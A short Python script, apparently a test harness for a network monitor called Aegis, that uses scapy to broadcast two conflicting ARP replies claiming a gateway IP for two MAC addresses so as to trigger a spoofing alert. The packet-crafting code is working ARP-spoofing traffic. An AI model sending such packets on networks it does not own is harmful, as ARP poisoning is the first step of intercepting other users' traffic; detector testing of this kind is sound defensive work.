# arp_spoof_demo.py — ARP Spoofing Simulation
# Sends ARP reply packets mapping the same IP to two different MAC addresses,
# simulating a Man-in-the-Middle (MITM) attack precursor.
# Aegis detects when the same IP is seen with multiple MACs in the ARP table.

from scapy.all import ARP, Ether, sendp

# ── CONFIGURATION ───────────────────────────────────────────
# This simulates a gateway IP being claimed by two different MACs
VICTIM_IP       = "192.168.1.1"   # IP being spoofed (e.g., your gateway)

# Two different attacker MAC addresses claiming ownership of VICTIM_IP
MAC_ORIGINAL    = "aa:bb:cc:dd:ee:01"   # First ARP reply (legitimate-looking)
MAC_SPOOFED     = "aa:bb:cc:dd:ee:ff"   # Second ARP reply (attacker's MAC)

IFACE           = "Wi-Fi"              # <-- UPDATE if needed

print(f"[ARP SPOOF] Sending conflicting ARP replies for {VICTIM_IP}")
print(f"  Packet 1: {VICTIM_IP} → {MAC_ORIGINAL}")
print(f"  Packet 2: {VICTIM_IP} → {MAC_SPOOFED}  ← SPOOFED")

# First ARP reply — appears legitimate
pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=MAC_ORIGINAL) / \
       ARP(op=2, psrc=VICTIM_IP, hwsrc=MAC_ORIGINAL, pdst="192.168.1.100")

# Second ARP reply — attacker claims same IP with different MAC
pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff", src=MAC_SPOOFED) / \
       ARP(op=2, psrc=VICTIM_IP, hwsrc=MAC_SPOOFED, pdst="192.168.1.100")

sendp(pkt1, iface=IFACE, verbose=False)
sendp(pkt2, iface=IFACE, verbose=False)
# Goodluck, if you actually face this IRL, 💀

print("[ARP SPOOF] Done — check AEGIS for CRITICAL alert (IP mapped to 2 MACs).")
